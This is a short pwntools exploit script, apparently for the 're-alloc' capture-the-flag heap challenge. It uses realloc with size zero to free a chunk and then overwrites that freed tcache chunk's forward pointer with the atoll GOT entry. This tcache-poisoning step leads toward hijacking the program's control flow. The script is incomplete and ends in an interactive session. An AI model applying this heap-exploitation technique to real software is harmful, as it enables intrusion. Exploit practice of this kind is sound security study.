#!/usr/bin/env python3

from pwn import *

exe = ELF("./re-alloc_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = exe
p = process()

def alloc(index,size,data):
    p.sendlineafter(b'Your choice: ',b'1')
    p.sendlineafter(b'Index:',f'{index}'.encode())
    p.sendlineafter(b'Size:',f'{size}'.encode())
    p.sendafter(b'Data:',data)

def realloc(index,size,data):
    p.sendlineafter(b'Your choice: ',b'2')
    p.sendlineafter(b'Index:',f'{index}'.encode())
    p.sendlineafter(b'Size:',f'{size}'.encode())

    if size == 0:
        return
    p.sendlineafter(b'Data:',data)
def free(idx):
    p.sendlineafter(b'Your choice: ',b'3')
    p.sendlineafter(b'Index:',f'{idx}'.encode())

alloc(0,0x20,b'a'*0x20)
realloc(0,0,b'b'*0x60)  #free idx 0
realloc(0,0x30,p64(exe.got.atoll))  # change fd to atoll@got
input()
alloc(1,0x20,b'b'*0x20)
free(0)
realloc(1,0x40,b'c'*0x40)
free(1)
p.interactive()
